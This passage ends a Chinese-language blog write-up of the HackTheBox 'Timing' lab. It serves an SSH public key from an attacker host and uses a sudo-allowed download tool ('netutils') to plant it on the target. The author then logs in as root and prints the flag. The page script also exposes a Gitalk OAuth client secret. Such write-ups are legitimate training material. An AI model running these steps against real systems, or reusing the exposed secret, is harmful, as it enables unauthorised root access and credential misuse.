+SHA256:M12TnW2ZwayF1exH6fYv+fqbplhkdyxg/9oFI+yu7os root@root
+The key&#39;s randomart image is:
++---[RSA 3072]----+
+|              =+o|
+|             + BB|
+|            * *=o|
+|         . + = =o|
+|        S . oo*.=|
+|         o .o..=o|
+|            .. .+|
+|         . .o o++|
+|        Eo=+..=B=|
++----[SHA256]-----+
+
+┌──(root💀root)-[~/Desktop]
+└─# ls -la /root/.ssh                                                   
+总用量 20
+drwx------  2 root root 4096  1月  1 12:56 .
+drwx------ 28 root root 4096  1月  1 12:56 ..
+-rw-------  1 root root 2590  1月  1 12:56 id_rsa
+-rw-r--r--  1 root root  563  1月  1 12:56 id_rsa.pub
+-rw-r--r--  1 root root 3772 12月 31 17:45 known_hosts
+
+┌──(root💀root)-[~/Desktop]
+└─# cp /root/.ssh/id_rsa.pub keys     
+
+┌──(root💀root)-[~/Desktop]
+└─# ls               
+keys
+
+┌──(root💀root)-[~/Desktop]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<p>接着使用python3开启一个http服务</p>
+<pre><code class="bash">aaron@timing:~$ sudo /usr/bin/netutils
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input &gt;&gt; 1
+Enter Url: http://10.10.14.52/keys
+Initializing download: http://10.10.14.52/keys
+File size: 563 bytes
+Opening output file keys
+Server unsupported, starting from scratch with one connection.
+Starting download
+
+Downloaded 563 byte in 0 seconds. (0.91 KB/s)
+
+netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit
+Input &gt;&gt; 2
+</code></pre>
+<p>接着使用&#x2F;usr&#x2F;bin&#x2F;netutils来下载keys</p>
+<p>然后使用ssh -i进行连接登录</p>
+<pre><code class="bash">┌──(root💀root)-[~/.ssh]
+└─# ssh -i id_rsa root@10.10.11.135
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jan  1 13:29:39 UTC 2022
+
+  System load:  0.0               Processes:           202
+  Usage of /:   48.7% of 4.85GB   Users logged in:     1
+  Memory usage: 10%               IP address for eth0: 10.10.11.135
+  Swap usage:   0%
+
+8 updates can be applied immediately.
+8 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue Dec  7 12:08:29 2021
+root@timing:~# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功拿到root权限</p>
+<pre><code class="bash">root@timing:~# ls
+axel  netutils.jar  root.txt
+root@timing:~# cat root.txt 
+c9e18f123e0e2012bbf16a0f64bc3715
+</code></pre>
+<p>成功拿到root权限的flag文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/&title=《Timing - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/&title=《Timing - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Timing - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/01/08/Hackthebox/Hackthebox-Pandora/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Pandora - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/12/16/Hackthebox/Hackthebox-Unicode/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Unicode - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/&title=《Timing - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/&title=《Timing - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Timing - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/01/Hackthebox/Hackthebox-Timing/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACw0lEQVR42u3aQY4iMQwFUO5/6RmpVyONKnzbMc3isULV1VRekBLz49crfv35ef37/vz6/3/P15/ueRrD5RceHh5ea+jnh52vJH89T9ZkPG8mCA8PD2+Nl28G5yHmQ68+6/zJj9fx8PDwfpVXLbjPm0T++fn9eHh4eN/MOw+0V0zPpxsPDw/vk7zkx38OSIrgPAKuRsl4eHh427zeAdjvvl8/38PDw8NrnapXN4Bee0E1oi2MFg8PD2+BVy2Ce+1QyQQlxXq+C7x6NT4eHh7egHcrok2W+GpJnccceHh4eNu8ZLmvLuXJROT4aqGPh4eHt8GbxATzQnxSfEdfDB4eHt4Cr3qEX40nJjFute2gPBQ8PDy8Fu/W0p+UyPm2MQmFH/c9PDw8vAVevljn4WweMSQhSLkox8PDw1vgVaPbvB1q0nCQb0LlKAQPDw/vEm+y6M+PsjbCkTcxLh4eHt4lXhJG9O7Mt5wJGA8PD+8zvLwITqry6lJ+K+x4xOPh4eGt8ZKFOzkSmwTB+fQVAgs8PDy8j/Cqj0+W+3zQk8mKNgY8PDy8MS+/NQ8mJqV575gNDw8P73t4vQOtXrk8PzZ7nCA8PDy8q7w8Ep0/rBpkzJu68PDw8PZ4d2PZ5Er1QKv69eDh4eHt8aoNqb1Dsl4bQXWdfxNn4OHh4V3i3Tr0qoa2SeSRx7tvwgg8PDy8Nd48SiiHBceJyLeWxy8GDw8Pb4GX/8ift1jlbQfVCSo3MeDh4eENeJMWq2pcm2AmTVfRLwY8PDy8qzHu5b0lLpTzI66V9gI8PDy8Fm/eaJWXxdVQo9rshYeHh/dJXu/4qtoikIcavWO2crKCh4eHt8zLQ9h5o0AvnnjsJsPDw8P7Gl6vXM4j12rrwKikxsPDwyvy8iCgGtpWt428QSG6goeHh7fAmxyA9YbV4/WO0PDw8PCu8v4CRLYYPEwwBuQAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
